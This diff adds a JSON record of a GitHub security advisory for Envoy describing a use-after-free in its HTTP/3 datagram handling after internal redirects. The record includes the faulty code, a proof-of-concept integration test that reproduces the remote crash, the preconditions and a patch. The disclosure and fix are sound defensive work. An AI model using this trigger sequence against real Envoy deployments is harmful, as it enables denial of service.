@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-r6j2-mrm5-72mg",
+  "repo": {
+    "cve_id": "CVE-2026-73512",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-416"
+    ],
+    "description": "### Summary\r\nA Use-After-Free (UAF) vulnerability exists in the Envoy QUIC/HTTP/3 stack when HTTP/3 Datagrams (Capsule Protocol) are used in conjunction with features that trigger stream recreation, such as internal redirects or on-demand Virtual Host Discovery Service (VHDS). A remote attacker can trigger a crash (Denial of Service) by sending an HTTP/3 Datagram after a stream has been recreated.\r\n\r\n### Details\r\n\r\nWhen Capsule Protocol is enabled for an HTTP/3 stream (e.g., via the Capsule-Protocol: ?1 header or an extended CONNECT connect-udp request), Envoy creates an HttpDatagramHandler to process incoming and outgoing HTTP/3 Datagrams (QUIC DATAGRAM frames).\r\n\r\nUpon initialization in useCapsuleProtocol(), the HttpDatagramHandler caches a raw pointer to the current Http::RequestDecoder (which corresponds to the ActiveStream in the HTTP Connection Manager).\r\n\r\nIf the stream is subsequently recreated-most commonly due to an internal redirect (e.g., upstream returns a 3xx responding to a route configured with internal_redirect_policy)-the HTTP Connection Manager creates a new ActiveStream and calls setRequestDecoder() on the EnvoyQuicServerStream to update the decoder reference.\r\n\r\nHowever, EnvoyQuicServerStream::setRequestDecoder failed to propagate this new decoder pointer to the existing HttpDatagramHandler.\r\n\r\nWhen a subsequent HTTP/3 Datagram is received on the same QUIC connection for that stream, HttpDatagramHandler::OnHttp3Datagram is invoked. It attempts to use the cached, but now freed, RequestDecoder pointer to forward the decoded capsule data:\r\n\r\n```\r\n// source/common/quic/http_datagram_handler.cc\r\nvoid HttpDatagramHandler::decodeCapsule(const quiche::Capsule& capsule) {\r\n  // ...\r\n  if (stream_decoder_) {\r\n    stream_decoder_->decodeData(*buffer, stream_.IsDoneReading()); // UAF HERE\r\n  }\r\n}\r\n```\r\nThis result is a Use-After-Free vulnerability. In standard builds, this often manifests as a segmentation fault or unexpected behavior due to vtable corruption. In sanitizer builds (ASAN/UBSan), it is detected as a member call on an invalid object with an invalid vptr.\r\n\r\n### PoC\r\nRun the following integration test under ASAN. \r\n\r\n```\r\nTEST_P(QuicHttpIntegrationTest, ReproduceUAF_f004_Integration) {\r\n  auto handle = config_helper_.createVirtualHost(\"handle.internal.redirect\");\r\n  handle.mutable_routes(0)->set_name(\"redirect\");\r\n  handle.mutable_routes(0)->mutable_route()->mutable_internal_redirect_policy();\r\n  config_helper_.addVirtualHost(handle);\r\n  initialize();\r\n\r\n  codec_client_ = makeHttpConnection(lookupPort(\"http\"));\r\n\r\n  Http::TestRequestHeaderMapImpl request_headers{\r\n      {\":method\", \"GET\"},\r\n      {\":path\", \"/test/long/url\"},\r\n      {\":scheme\", \"http\"},\r\n      {\":authority\", \"handle.internal.redirect\"},\r\n      {\"capsule-protocol\", \"?1\"}};\r\n\r\n  auto encoder_decoder = codec_client_->startRequest(request_headers, false);\r\n  auto& request_encoder = encoder_decoder.first;\r\n  auto response = std::move(encoder_decoder.second);\r\n\r\n  auto& stream = request_encoder.getStream();\r\n  auto stream_id = stream.codecStreamId();\r\n  ASSERT_TRUE(stream_id.has_value());\r\n\r\n  AssertionResult result = fake_upstreams_[0]->waitForHttpConnection(*dispatcher_, fake_upstream_connection_);\r\n  RELEASE_ASSERT(result, result.message());\r\n  result = fake_upstream_connection_->waitForNewStream(*dispatcher_, upstream_request_);\r\n  RELEASE_ASSERT(result, result.message());\r\n  ASSERT_TRUE(upstream_request_->waitForHeadersComplete());\r\n\r\n  Http::TestResponseHeaderMapImpl redirect_response{{\":status\", \"302\"},\r\n                                                    {\"content-length\", \"0\"},\r\n                                                    {\"location\", \"http://authority2/new/url\"}};\r\n\r\n  upstream_request_->encodeHeaders(redirect_response, true);\r\n\r\n  result = fake_upstream_connection_->waitForNewStream(*dispatcher_, upstream_request_);\r\n  RELEASE_ASSERT(result, result.message());\r\n  ASSERT_TRUE(upstream_request_->waitForHeadersComplete());\r\n\r\n  EnvoyQuicClientSession* quic_session =\r\n      static_cast<EnvoyQuicClientSession*>(codec_client_->connection());\r\n  \r\n  quic::DatagramStatus status = quic_session->SendHttp3Datagram(stream_id.value(), \"test_payload\");\r\n  printf(\"SendHttp3Datagram status: %d\\n\", static_cast<int>(status));\r\n  codec_client_->sendData(*request_encoder_, \"\", true);\r\n\r\n  ASSERT_TRUE(upstream_request_->waitForData(*dispatcher_, \"test_payload\"));\r\n  upstream_request_->encodeHeaders(default_response_headers_, true);\r\n\r\n  ASSERT_TRUE(response->waitForEndStream());\r\n  ASSERT_TRUE(response->complete());\r\n  EXPECT_EQ(\"200\", response->headers().getStatusValue());\r\n}\r\n```\r\n\r\n### Impact\r\nHigh impact due to potential crash/undefined behavior.\r\n\r\nHowever, there's a number of preconditions that must be met: \r\n1. Envoy must be configured with an HTTP/3 / QUIC listener with datagrams enabled.\r\n2. The client must initiate a flow that opts into Capsule Protocol (e.g., sending Capsule-Protocol: ?1 or using extended CONNECT).\r\n3. The request must trigger a recreateStream() path. The most accessible trigger is an internal redirect policy combined with an upstream returning a 3xx response.\r\n\r\n### Potential fix\r\n\r\n```\r\n// source/common/quic/envoy_quic_server_stream.h\r\nvoid setRequestDecoder(Http::RequestDecoder& decoder) override {\r\n  request_decoder_ = decoder.getRequestDecoderHandle();\r\n  stats_gatherer_->setAccessLogHandlers(request_decoder_->get()->accessLogHandlers());\r\n#ifdef ENVOY_ENABLE_HTTP_DATAGRAMS\r\n  if (http_datagram_handler_) {\r\n    http_datagram_handler_->setStreamDecoder(request_decoder_->get().ptr());\r\n  }\r\n#endif\r\n}\r\n```\r\n\r\n### Gen AI Usage\r\nThis vulnerability was detected with Claude Mythos and reproduced by Gemini.",
+    "ghsa_id": "GHSA-r6j2-mrm5-72mg",
+    "html_url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-r6j2-mrm5-72mg",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-r6j2-mrm5-72mg"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-73512"
+      }
+    ],
+    "published_at": "2026-08-26T14:03:04Z",
+    "references": [],
+    "severity": "high",
+    "summary": "use-after-free in QUIC on internal redirects",
+    "updated_at": "2026-08-26T14:03:04Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "envoy proxy",
+          "name": "Envoy"
+        },
+        "patched_versions": "1.39.1, 1.38.4, 1.37.6, 1.36.10",
+        "vulnerable_version_range": "<1.40.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "envoyproxy/envoy"
+}
